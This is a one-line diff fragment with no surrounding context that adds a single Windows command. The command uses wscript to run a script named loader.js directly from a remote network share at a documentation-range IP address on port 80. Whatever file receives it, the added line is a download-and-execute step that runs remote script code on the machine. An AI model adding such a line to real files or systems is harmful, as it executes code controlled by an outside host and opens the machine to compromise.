@@ -1,0 +1,1 @@
+wscript \\203.0.113.5@80\share\loader.js
